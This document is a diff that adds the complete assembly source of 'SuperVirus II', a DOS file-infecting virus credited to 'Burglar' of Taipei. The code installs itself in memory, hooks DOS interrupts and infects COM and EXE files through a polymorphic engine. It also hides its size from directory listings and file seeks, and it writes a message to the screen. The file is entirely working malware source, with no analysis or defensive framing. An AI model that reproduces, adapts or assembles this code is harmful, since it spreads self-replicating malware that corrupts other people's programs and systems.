@@ -1,0 +1,931 @@
+
+; SuperVirus II
+; by Burglar from Taiwan
+; uses the PME engine by the same author.
+
+        .286
+
+        .MODEL  SMALL
+        .CODE
+
+        EXTRN   PME:NEAR, PME_END:NEAR
+
+        MOV     AX,CS
+        ADD     AX,30H
+        CALL    $+3
+        POP     BX
+        CMP     BH,3
+        JE      EEE
+        SUB     AX,10H
+EEE:
+        PUSH    AX
+        PUSH    OFFSET $+4
+        RETF
+
+        MOV     AX,0ABCDH
+        INT     21H
+        CMP     AX,0DCBAH
+        JNE     TSR
+
+        CMP     CS:C_E,0
+        JE      COM
+
+        MOV     AX,DS
+        ADD     AX,10H
+        ADD     CS:_SS,AX
+        ADD     CS:_CS,AX
+        CLI
+        MOV     SP,CS:_SP
+        MOV     SS,CS:_SS
+        JMP     DWORD PTR CS:_IP
+
+COM:
+        PUSH    DS
+        PUSH    100H
+        MOV     SI,VIR_LEN+10H+100H+200H
+        MOV     DI,100H
+        MOV     CX,CS:LEN_LOW
+        CLD
+        CLI
+        INT     3
+REP     MOVSB
+        RETF
+
+TSR:
+        MOV     CS:FLAG,0
+        MOV     CS:IN_VIR,0
+        MOV     AX,DS
+        DEC     AX
+        MOV     DS,AX
+        MOV     BX,DS:[3]
+        MOV     AX,VIR_LEN+1FH
+        SHR     AX,4
+        SUB     BX,AX
+        MOV     AH,4AH
+        INT     21H
+
+        MOV     AX,5800H
+        INT     21H
+        PUSH    AX
+        MOV     AX,5802H
+        INT     21H
+        PUSH    AX
+        MOV     BX,82H
+        MOV     AX,5801H
+        INT     21H
+        MOV     BX,1
+        MOV     AX,5803H
+        INT     21H
+
+        MOV     BX,VIR_LEN+0FH
+        SHR     BX,4
+        MOV     AH,48H
+        INT     21H
+
+        MOV     ES,AX
+        DEC     AX
+        MOV     DS,AX
+        MOV     WORD PTR DS:[1],8
+        PUSH    CS
+        POP     DS
+        XOR     SI,SI
+        XOR     DI,DI
+        MOV     CX,VIR_LEN
+        CLD
+REP     MOVSB
+
+        PUSH    ES
+        PUSH    OFFSET GO
+        RETF
+GO:
+        MOV     AH,4
+        INT     1AH
+        XOR     DH,DL
+        JNZ     QUIET
+        MOV     AX,3508H
+        INT     21H
+        MOV     WORD PTR CS:I8,BX
+        MOV     WORD PTR CS:I8+2,ES
+        MOV     DX,OFFSET INT8
+        PUSH    CS
+        POP     DS
+        MOV     AX,2508H
+        INT     21H
+QUIET:
+        POP     BX
+        XOR     BH,BH
+        MOV     AX,5803H
+        INT     21H
+        POP     BX
+        MOV     AX,5801H
+        INT     21H
+
+        MOV     AH,13H
+        INT     2FH
+        MOV     CS:I_13H_IP,BX
+        MOV     CS:I_13H_CS,ES
+        MOV     AH,13H
+        INT     2FH
+
+        CALL    GET_21H_ENTRY
+                                                ;!!!
+        PUSH    CS:I_21H_CS
+        POP     CS:CS1
+        PUSH    CS:I_21H_CS
+        POP     CS:CS2
+        PUSH    CS:I_21H_CS
+        POP     CS:CS3
+        PUSH    CS:I_21H_CS
+        POP     CS:CS4
+        PUSH    CS
+        POP     CS:CS5
+                                        ;INSTALL 1ST INT 21H
+        MOV     SI,CS:I21HIP_F
+        MOV     DI,OFFSET ORG1
+        MOV     DS,CS:I_21H_CS
+        PUSH    [SI]
+        POP     CS:[DI]
+        PUSH    [SI+2]
+        POP     CS:[DI+2]
+        MOV     AX,SI
+        ADD     AX,5
+        MOV     BL,[SI+4]
+        XOR     BH,BH
+        ADD     AX,BX
+        CMP     [SI+4],BYTE PTR 80H
+        JB      LOC8
+        SUB     AX,100H
+LOC8:
+        MOV     CS:IP2,AX
+        PUSH    CS:I21HIP_F
+        POP     CS:IP1
+        ADD     CS:IP1,5
+        MOV     BYTE PTR [SI],0EAH
+        MOV     WORD PTR [SI+1],OFFSET INT21H1
+        MOV     [SI+3],CS
+
+                                        ;INSTALL 2TH INT 21H
+        MOV     SI,CS:I_21H_IP
+        MOV     DI,OFFSET ORG2
+        MOV     DS,CS:I_21H_CS
+        PUSH    [SI]
+        POP     CS:[DI]
+        PUSH    [SI+2]
+        POP     CS:[DI+2]
+        MOV     AX,SI
+        ADD     AX,5
+        MOV     BL,[SI+4]
+        XOR     BH,BH
+        ADD     AX,BX
+        CMP     [SI+4],BYTE PTR 80H
+        JB      LOC9
+        SUB     AX,100H
+LOC9:
+        MOV     CS:IP4,AX
+        PUSH    CS:I_21H_IP
+        POP     CS:IP3
+        ADD     CS:IP3,5
+        MOV     [SI],BYTE PTR 0EAH
+        MOV     WORD PTR [SI+1],OFFSET INT21H2
+        MOV     [SI+3],CS
+
+        MOV     AH,51H
+        INT     21H
+        MOV     DS,BX
+        MOV     ES,BX
+
+        CMP     CS:C_E,0
+        JE      COM1
+
+        MOV     AX,DS
+        ADD     AX,10H
+        ADD     CS:_SS,AX
+        ADD     CS:_CS,AX
+        CLI
+        MOV     SP,CS:_SP
+        MOV     SS,CS:_SS
+        JMP     DWORD PTR CS:_IP
+
+COM1:
+        MOV     SI,VIR_LEN+10H+100H+200H
+        MOV     DI,100H
+        MOV     CX,CS:LEN_LOW
+        CLD
+REP     MOVSB
+        PUSH    DS
+        PUSH    100H
+        RETF
+
+
+GET_21H_ENTRY   PROC
+        PUSH    AX
+        PUSH    BX
+        PUSH    CX
+        PUSH    DS
+
+        MOV     CS:FLAG,0
+        XOR     AX,AX
+        MOV     DS,AX
+
+        MOV     BX,30H*4+1
+        LDS     BX,[BX]
+        CMP     BYTE PTR [BX],0EAH
+        JNE     DOSHIGH
+
+        LDS     BX,[BX+1]
+DOSHIGH:
+        CMP     WORD PTR [BX+6],2EFFH
+        JNE     DOSLOW
+
+        MOV     BX,[BX+8]
+        LDS     BX,[BX]
+DOSLOW:
+        MOV     CX,2CH
+        ADD     BX,25H
+LOC_1:
+        CMP     WORD PTR [BX],0FC80H
+        JNE     LOC_2
+        MOV     CS:I_21H_IP,BX
+        CMP     CS:FLAG,0
+        JNE     LOC_2
+        MOV     CS:I21HIP_F,BX
+        NOT     CS:FLAG
+LOC_2:
+        INC     BX
+        LOOP    LOC_1
+
+;       ADD     CS:I_21H_IP,5
+        MOV     CS:I_21H_CS,DS                          ;INT 21H ENTRY OK!
+
+        POP     DS
+        POP     CX
+        POP     BX
+        POP     AX
+
+        RET
+
+I21HIP_F        DW      0
+I_21H_IP        DW      0
+I_21H_CS        DW      0
+GET_21H_ENTRY   ENDP
+
+
+INT21H1 PROC
+        PUSHF
+        CMP     AX,0ABCDH
+        JNE     LOC1
+        MOV     AX,0DCBAH
+        POPF
+        IRET
+LOC1:
+        CMP     AH,11H
+        JE      DIR
+        CMP     AH,12H
+        JE      DIR
+        CMP     AH,6CH
+        JNE     LOC2
+        JMP     JOB1
+LOC2:
+        POPF
+ORG1:   DB      4 DUP (?)
+        DB      5
+        DB      0EAH
+IP1     DW      ?
+CS1     DW      ?
+        DB      0EAH
+IP2     DW      ?
+CS2     DW      ?
+
+DIR:
+        DB      9AH
+        DW      OFFSET ORG1
+CS5     DW      ?
+        PUSHF
+        CMP     AL,0FFH
+        JNE     L0841
+
+        POPF
+        RETF    2
+L0841:
+        MOV     CS:IN_VIR,1
+        MOV     CS:D_J,0
+        PUSHA
+        PUSH    DS
+        PUSH    ES
+
+        MOV     AH,2FH
+        INT     21H
+        MOV     SI,BX
+        PUSH    ES
+        POP     DS
+        MOV     DI,OFFSET BUFF
+        PUSH    CS
+        POP     ES
+        CLD
+        CMP     BYTE PTR [SI],0FFH
+        JNE     L1235
+        ADD     SI,7
+L1235:
+        CMP     WORD PTR [SI+19H],0C800H
+        JB      L1230
+        SUB     WORD PTR [SI+19H],0C800H
+        SUB     WORD PTR [SI+1DH],VIR_LEN+10H+200H
+        SBB     WORD PTR [SI+1FH],0
+        JMP     L4310
+L1230:
+        LODSB
+        OR      AL,AL
+        JZ      L1537
+        ADD     AL,40H
+        MOV     AH,':'
+        STOSW
+L1537:
+        MOV     BP,SI
+        ADD     BP,8
+
+        CMP     WORD PTR [SI+8],'OC'
+        JNE     L5242
+        CMP     BYTE PTR [SI+10],'M'
+        JE      L0546
+L5242:
+        CMP     WORD PTR [SI+8],'XE'
+        JNE     L4310
+        CMP     BYTE PTR [SI+10],'E'
+        JNE     L4310
+L0546:
+        LODSB
+        CMP     AL,' '
+        JE      L0647
+L0246:
+        STOSB
+        CMP     BP,SI
+        JNE     L0546
+L0647:
+        MOV     AL,'.'
+        STOSB
+        MOV     SI,BP
+        MOVSW
+        MOVSB
+        XOR     AL,AL
+        STOSB
+
+        MOV     DX,OFFSET BUFF
+        PUSH    CS
+        POP     DS
+        JMP     J0
+L4310:
+        MOV     CS:IN_VIR,0
+        POP     ES
+        POP     DS
+        POPA
+        POPF
+        RETF    2
+
+INT21H1 ENDP
+
+INT21H2 PROC
+        PUSHF
+        CMP     CS:IN_VIR,1
+        JE      L2933
+        CMP     AX,4200H
+        JE      STEAL
+        CMP     AX,4202H
+        JE      STEAL
+        CMP     AH,3DH
+        JE      JOB1
+        CMP     AH,43H
+        JE      JOB1
+        CMP     AH,4BH
+        JE      JOB1
+        CMP     AH,56H
+        JNE     L2933
+JOB1:
+        JMP     JOB
+L2933:
+        POPF
+ORG2:   DB      4 DUP (?)
+        DB      5
+        DB      0EAH
+IP3     DW      ?
+CS3     DW      ?
+        DB      0EAH
+IP4     DW      ?
+CS4     DW      ?
+
+STEAL:
+        MOV     CS:IN_VIR,1
+        PUSH    DS
+        PUSH    ES
+        PUSHA
+
+        MOV     AX,5700H
+        INT     21H
+        CMP     DX,0C800H
+        JNB     L4156
+        MOV     CS:IN_VIR,0
+        POPA
+        POP     ES
+        POP     DS
+        POPF
+        JMP     ORG2
+L4156:
+        XOR     CX,CX
+        XOR     DX,DX
+        MOV     AX,4200H
+        INT     21H
+        MOV     DX,OFFSET MZ
+        PUSH    CS
+        POP     DS
+        MOV     CX,2
+        MOV     AH,3FH
+        INT     21H
+        CMP     CS:MZ,'ZM'
+        JE      EXE8
+        POPA
+        OR      AL,AL
+        JNE     L5854
+        ADD     DX,VIR_LEN+10H+200H
+        ADC     CX,0
+        POP     ES
+        POP     DS
+        POPF
+        INT     21H
+        PUSHF
+        SUB     AX,VIR_LEN+10H+200H
+        SBB     DX,0
+        MOV     CS:IN_VIR,0
+        POPF
+        RETF    2
+L5854:
+        POP     ES
+        POP     DS
+        POPF
+        INT     21H
+        PUSHF
+        SUB     AX,VIR_LEN+10H+200H
+        SBB     DX,0
+        MOV     CS:IN_VIR,0
+        POPF
+        RETF    2
+
+EXE8:
+        POPA
+        CMP     AL,2
+        JNE     L3149
+        SUB     DX,VIR_LEN+10H+200H
+        SBB     CX,0
+        POP     ES
+        POP     DS
+        POPF
+        INT     21H
+        PUSHF
+        MOV     CS:IN_VIR,0
+        POPF
+        RETF    2
+L3149:
+        MOV     CS:IN_VIR,0
+        POP     ES
+        POP     DS
+        POPF
+        JMP     ORG2
+
+JOB:
+        MOV     CS:IN_VIR,1
+        MOV     CS:D_J,1
+        PUSHA
+        PUSH    DS
+        PUSH    ES
+
+        CMP     AH,6CH
+        JNE     J0
+        MOV     DX,SI
+J0:
+        MOV     WORD PTR CS:F_NAME,DX
+        MOV     WORD PTR CS:F_NAME+2,DS
+        MOV     SI,DX
+        CLD
+OO:     LODSB
+        OR      AL,AL
+        JNZ     OO
+        SUB     SI,12
+        MOV     DI,OFFSET _COMM
+        PUSH    CS
+        POP     ES
+        MOV     CX,11
+REPE    CMPSB
+        JNE     NOT_COMM
+
+        JMP     EXIT
+NOT_COMM:
+        MOV     DX,WORD PTR CS:F_NAME
+        MOV     AX,3D00H
+        PUSHF
+        CALL    DWORD PTR CS:IP3
+
+        MOV     BX,AX
+        MOV     AX,5700H
+        INT     21H
+
+        MOV     AH,3EH
+        INT     21H
+
+        CMP     DX,0C800H
+        JB      COM_EXE
+        JMP     EXIT
+COM_EXE:
+        MOV     CS:TIME,CX
+        MOV     CS:DATE,DX
+
+        MOV     SI,WORD PTR CS:F_NAME
+        MOV     DS,WORD PTR CS:F_NAME+2
+        CLD
+C0:
+        LODSB
+        OR      AL,AL
+        JNZ     C0
+        CMP     WORD PTR [SI-3],'MO'
+        JNE     C1
+        CMP     WORD PTR [SI-5],'C.'
+        JE      COM2
+C1:
+        CMP     WORD PTR [SI-3],'EX'
+        JNE     C2
+        CMP     WORD PTR [SI-5],'E.'
+        JE      EXE2
+C2:
+        JMP     EXIT
+COM2:
+        MOV     CS:C_E,0
+        JMP     INFECT
+EXE2:
+        MOV     CS:C_E,1
+
+INFECT:
+        IN      AL,21H
+        OR      AL,1
+        OUT     21H,AL
+
+        MOV     AX,3513H
+        INT     21H
+        MOV     CS:O_13H_IP,BX
+        MOV     CS:O_13H_CS,ES
+
+        MOV     DX,CS:I_13H_IP
+        MOV     DS,CS:I_13H_CS
+        MOV     AX,2513H
+        INT     21H
+
+        MOV     AX,3524H
+        INT     21H
+        MOV     CS:O_24H_IP,BX
+        MOV     CS:O_24H_CS,ES
+
+        MOV     DX,OFFSET INT24H
+        PUSH    CS
+        POP     DS
+        MOV     AX,2524H
+        INT     21H
+
+        MOV     AH,52H
+        INT     21H
+        MOV     DS,ES:[BX-2]
+LL:
+        CMP     DS:[0],BYTE PTR 'Z'
+        JE      KK
+        MOV     AX,DS
+        INC     AX
+        ADD     AX,WORD PTR DS:[3]
+        MOV     DS,AX
+        JMP     LL
+KK:
+        MOV     AX,DS
+        SUB     AX,2000H
+        MOV     CS:MEM,AX
+
+        MOV     DX,WORD PTR CS:F_NAME
+        MOV     DS,WORD PTR CS:F_NAME+2
+        MOV     AX,4300H
+        INT     21H
+        MOV     CS:ATTR,CX
+
+        XOR     CX,CX
+        MOV     AX,4301H
+        INT     21H
+
+        MOV     AX,3D02H
+        PUSHF
+        CALL    DWORD PTR CS:IP3
+
+        MOV     BX,AX
+        MOV     AH,45H
+        INT     21H
+
+        MOV     CS:HANDLE,AX
+        MOV     AH,3EH
+        INT     21H
+
+        CMP     CS:C_E,0
+        JNE     EXE3
+
+        MOV     BX,CS:HANDLE
+        XOR     CX,CX
+        XOR     DX,DX
+        MOV     AX,4202H
+        INT     21H
+        MOV     CS:LEN_LOW,AX
+
+        MOV     BX,CS:HANDLE
+        XOR     CX,CX
+        XOR     DX,DX
+        MOV     AX,4200H
+        INT     21H
+
+        MOV     ES,CS:MEM
+        XOR     DX,DX
+        PUSH    CS
+        POP     DS
+        MOV     CX,VIR_LEN
+        MOV     BX,100H
+
+        CALL    PME
+
+        PUSH    DX
+        PUSH    CX
+        ADD     CX,10H
+        MOV     DX,CX
+        MOV     BX,CS:HANDLE
+        MOV     CX,CS:LEN_LOW
+        MOV     AH,3FH
+        PUSHF
+        CALL    DWORD PTR CS:IP3
+
+        XOR     CX,CX
+        XOR     DX,DX
+        MOV     AX,4200H
+        PUSHF
+        CALL    DWORD PTR CS:IP3
+
+        POP     CX
+        ADD     CX,10H
+        ADD     CX,CS:LEN_LOW
+        POP     DX
+        MOV     AH,40H
+        PUSHF
+        CALL    DWORD PTR CS:IP3
+
+        JMP     DONE
+EXE3:
+        MOV     DX,OFFSET BUF
+        PUSH    CS
+        POP     DS
+        MOV     CX,18H
+        MOV     BX,CS:HANDLE
+        MOV     AH,3FH
+        INT     21H
+
+        PUSH    CS:BUF+0EH
+        POP     CS:_SS
+        PUSH    CS:BUF+10H
+        POP     CS:_SP
+        PUSH    CS:BUF+14H
+        POP     CS:_IP
+        PUSH    CS:BUF+16H
+        POP     CS:_CS
+
+        XOR     CX,CX
+        XOR     DX,DX
+        MOV     AX,4202H
+        INT     21H
+
+        MOV     CS:LEN_LOW,AX
+        MOV     CS:LEN_HIGH,DX
+
+        MOV     BX,AX
+        AND     BX,0FH
+        ADD     BX,VIR_LEN+200H
+        PUSH    BX
+        ADD     AX,10H
+        ADC     DX,0
+        AND     AX,0FFF0H
+        PUSH    AX
+        PUSH    DX
+        MOV     BX,10H
+        DIV     BX
+        SUB     AX,CS:BUF+8                             ;HEADER SIZE
+        MOV     CS:BUF+0EH,AX                           ;SS
+        MOV     CS:BUF+16H,AX                           ;CS
+        MOV     CS:BUF+10H,VIR_LEN+100H+200H            ;SP
+        MOV     CS:BUF+14H,0                            ;IP=0
+        POP     DX
+        POP     AX
+        POP     BX
+        PUSH    BX
+        PUSH    AX
+        PUSH    DX
+        ADD     AX,BX
+        ADC     DX,0
+        MOV     BX,200H
+        DIV     BX
+        OR      DX,DX
+        JE      LOC_6
+        INC     AX
+LOC_6:
+        MOV     CS:BUF+2,DX
+        MOV     CS:BUF+4,AX
+
+        XOR     CX,CX
+        XOR     DX,DX
+        MOV     BX,CS:HANDLE
+        MOV     AX,4200H
+        INT     21H
+
+        MOV     DX,OFFSET BUF
+        PUSH    CS
+        POP     DS
+        MOV     CX,18H
+        MOV     AH,40H
+        PUSHF
+        CALL    DWORD PTR CS:IP3
+
+        POP     CX
+        POP     DX
+        MOV     AX,4200H
+        INT     21H
+
+        MOV     ES,CS:MEM
+        XOR     DX,DX
+        PUSH    CS
+        POP     DS
+        MOV     CX,VIR_LEN
+        XOR     BX,BX
+
+        CALL    PME
+
+        POP     CX
+        MOV     BX,CS:HANDLE
+        MOV     AH,40H
+        PUSHF
+        CALL    DWORD PTR CS:IP3
+DONE:
+        MOV     CX,CS:TIME
+        MOV     DX,CS:DATE
+        ADD     DX,0C800H
+        MOV     AX,5701H
+        INT     21H
+
+        MOV     AH,3EH
+        INT     21H
+
+        MOV     DX,WORD PTR CS:F_NAME
+        MOV     DS,WORD PTR CS:F_NAME+2
+        MOV     CX,CS:ATTR
+        MOV     AX,4301H
+        INT     21H
+
+        IN      AL,21H
+        AND     AL,0FEH
+        OUT     21H,AL
+
+        MOV     DX,CS:O_13H_IP
+        MOV     DS,CS:O_13H_CS
+        MOV     AX,2513H
+        INT     21H
+
+        MOV     DX,CS:O_24H_IP
+        MOV     DS,CS:O_24H_CS
+        MOV     AX,2524H
+        INT     21H
+
+EXIT:
+        CMP     CS:D_J,0
+        JNE     L2205
+        JMP     L4310
+L2205:
+        POP     ES
+        POP     DS
+        POPA
+        CMP     AH,3DH
+        JE      L2554
+        MOV     CS:IN_VIR,0
+        POPF
+        JMP     ORG2
+L2554:                                          ;OPEN FILE CONDITION...
+        POPF
+        INT     21H
+        PUSHF
+        MOV     BX,AX
+        MOV     CS:IN_VIR,0
+        XOR     CX,CX
+        XOR     DX,DX
+        MOV     AX,4200H
+        INT     21H
+        MOV     AX,BX
+        POPF
+        RETF    2
+
+INT21H2 ENDP
+
+INT24H  PROC
+        XOR     AL,AL
+        IRET
+INT24H  ENDP
+
+INT8    PROC
+        PUSHA
+        PUSH    DS
+        PUSH    ES
+        MOV     SI,OFFSET MSG
+        PUSH    CS
+        POP     DS
+        MOV     DI,10
+        PUSH    0B800H
+        POP     ES
+        CLD
+        IN      AL,40H
+        MOV     AH,AL
+L4006:  LODSB
+        OR      AL,AL
+        JZ      L3923
+        STOSW
+        JMP     L4006
+L3923:
+        POP     ES
+        POP     DS
+        POPA
+        DB      0EAH
+I8      DD      ?
+INT8    ENDP
+
+
+;       data area
+
+MEM             DW      ?
+HANDLE          DW      ?
+TIME            DW      ?
+DATE            DW      ?
+LEN_LOW         DW      1
+LEN_HIGH        DW      ?
+BUF             DW      18H/2 DUP (?)
+_SS             DW      ?
+_SP             DW      ?
+_IP             DW      ?
+_CS             DW      ?
+F_NAME          DD      ?
+I_13H_IP        DW      ?
+I_13H_CS        DW      ?
+O_13H_IP        DW      ?
+O_13H_CS        DW      ?
+O_24H_IP        DW      ?
+O_24H_CS        DW      ?
+ATTR            DW      ?
+C_E             DB      ?
+FLAG            DB      0
+D_J             DB      0
+BUFF            DB      15 DUP (0)
+IN_VIR          DB      0
+MZ              DW      0
+_COMM           DB      'COMMAND.COM'
+MSG             DB      'Hello! This is [Super Virus-2] ... written by'
+                DB      ' Burglar'
+                DB      ' in Taipei, Taiwan',0
+
+
+VIR_LEN EQU     OFFSET PME_END
+
+
+        END
+
+
+GET_FILENAME    PROC
+        PUSH    AX
+        PUSH    BX
+        PUSH    DS
+
+        MOV     AH,51H
+        INT     21H
+
+        MOV     DS,BX
+        MOV     DS,[2CH]
+        XOR     BX,BX
+LOC_3:
+        CMP     WORD PTR [BX],0
+        JE      LOC_4
+
+        INC     BX
+        JMP     LOC_3
+LOC_4:
+        ADD     BX,4
+        MOV     CS:F_OFS,BX
+        MOV     CS:F_SEG,DS
+
+        POP     DS
+        POP     BX
+        POP     AX
+
+        RET
+
+F_OFS   DW      0
+F_SEG   DW      0
+GET_FILENAME    ENDP
+
+
